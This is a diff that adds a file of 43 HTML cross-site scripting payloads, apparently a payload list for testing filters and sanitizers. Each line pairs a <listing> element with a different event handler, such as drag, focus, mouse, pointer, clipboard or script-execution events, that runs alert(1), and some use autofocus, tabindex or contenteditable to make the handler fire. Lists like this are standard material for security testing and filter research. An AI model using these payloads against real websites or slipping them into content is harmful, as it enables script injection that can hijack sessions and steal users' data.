@@ -1,0 +1,43 @@
+<listing draggable="true" ondrag="alert(1)">test</listing>
+<listing draggable="true" ondragend="alert(1)">test</listing>
+<listing draggable="true" ondragenter="alert(1)">test</listing>
+<listing draggable="true" ondragleave="alert(1)">test</listing>
+<listing draggable="true" ondragstart="alert(1)">test</listing>
+<listing id=x tabindex=1 onactivate=alert(1)></listing>
+<listing id=x tabindex=1 onbeforeactivate=alert(1)></listing>
+<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>
+<listing id=x tabindex=1 ondeactivate=alert(1)></listing><input id=y autofocus>
+<listing id=x tabindex=1 onfocus=alert(1)></listing>
+<listing id=x tabindex=1 onfocusin=alert(1)></listing>
+<listing onafterscriptexecute=alert(1)><script>1</script>
+<listing onbeforecopy="alert(1)" contenteditable>test</listing>
+<listing onbeforecut="alert(1)" contenteditable>test</listing>
+<listing onbeforepaste="alert(1)" contenteditable>test</listing>
+<listing onbeforescriptexecute=alert(1)><script>1</script>
+<listing onblur=alert(1) tabindex=1 id=x></listing><input autofocus>
+<listing onclick="alert(1)">test</listing>
+<listing oncontextmenu="alert(1)">test</listing>
+<listing oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<listing oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<listing ondblclick="alert(1)" autofocus tabindex=1>test</listing>
+<listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>
+<listing onkeydown="alert(1)" contenteditable>test</listing>
+<listing onkeypress="alert(1)" contenteditable>test</listing>
+<listing onkeyup="alert(1)" contenteditable>test</listing>
+<listing onmousedown="alert(1)">test</listing>
+<listing onmouseenter="alert(1)">test</listing>
+<listing onmouseleave="alert(1)">test</listing>
+<listing onmousemove="alert(1)">test</listing>
+<listing onmouseout="alert(1)">test</listing>
+<listing onmouseover="alert(1)">test</listing>
+<listing onmouseup="alert(1)">test</listing>
+<listing onmousewheel=alert(1)>requires scrolling
+<listing onpaste="alert(1)" contenteditable>test</listing>
+<listing onpointerdown=alert(1)>XSS</listing>
+<listing onpointerenter=alert(1)>XSS</listing>
+<listing onpointerleave=alert(1)>XSS</listing>
+<listing onpointermove=alert(1)>XSS</listing>
+<listing onpointerout=alert(1)>XSS</listing>
+<listing onpointerover=alert(1)>XSS</listing>
+<listing onpointerrawupdate=alert(1)>XSS</listing>
+<listing onpointerup=alert(1)>XSS</listing>
